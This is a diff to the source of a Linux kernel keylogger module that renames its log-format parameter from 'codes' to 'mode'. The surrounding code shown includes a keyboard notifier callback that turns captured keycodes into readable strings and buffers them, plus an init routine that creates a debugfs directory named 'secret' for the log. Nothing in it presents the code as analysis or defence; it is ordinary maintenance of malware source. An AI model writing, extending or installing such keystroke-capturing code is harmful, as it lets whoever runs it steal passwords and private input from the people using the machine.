@@ -15,9 +15,9 @@ MODULE_LICENSE("GPL v2");
 #define DEC 2 // Type code for decimal log
 
 // Declarations
-static int codes; // User-specified log pattern
-module_param(codes, int, 0644);
-MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");
+static int mode; // User-specified log pattern
+module_param(mode, int, 0644);
+MODULE_PARM_DESC(mode, "log format (0:US keys (default), 1:Hexadecimal keycodes, 2:Decimal keycodes)");
 
 // Debugfs structures
 static struct dentry *file;
@@ -140,7 +140,7 @@ int cb(struct notifier_block *nblock,
 		return NOTIFY_OK; //returns 0x001
 	
 	/* Convert keycode to readable string in keybuf */
-	string_conv(param->value, param->shift, keybuf, codes);
+	string_conv(param->value, param->shift, keybuf, mode);
 	len = strlen(keybuf);
 	if (len < 1) /* Unmapped keycode */
 		return NOTIFY_OK; //returns 0x001
@@ -154,7 +154,7 @@ int cb(struct notifier_block *nblock,
 	buf_pos += len;
 
 	/* Append newline to keys in special cases */
-	if (codes) //for keys like ctrl, alt, del
+	if (mode) //for keys like ctrl, alt, del
 		keys_buf[buf_pos++] = '\n';
 	pr_debug("%s\n", keybuf);
 
@@ -164,7 +164,7 @@ int cb(struct notifier_block *nblock,
 // Module initialization
 static int __init keylogger_init(void)
 {
-    if (codes < 0 || codes > 2)
+    if (mode < 0 || mode > 2)
         return -EINVAL;
 
     subdir = debugfs_create_dir("secret", NULL); // Creates debugfs directory
